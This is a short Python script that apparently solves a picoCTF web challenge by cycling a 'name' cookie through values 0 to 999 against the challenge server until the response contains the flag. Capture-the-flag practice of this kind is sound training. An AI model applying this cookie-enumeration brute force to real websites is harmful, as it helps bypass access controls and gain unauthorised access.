import requests
from base64 import b64decode, b64encode

url = 'http://mercury.picoctf.net:54219/'


for i in range (1000):
    cookie = {
        "name": str(i)
    }
    print("Using cookie with name: " + cookie['name'])
    response = requests.get(url, cookies=cookie)
    if 'picoCTF' in response.text:
        print(response.text)
        break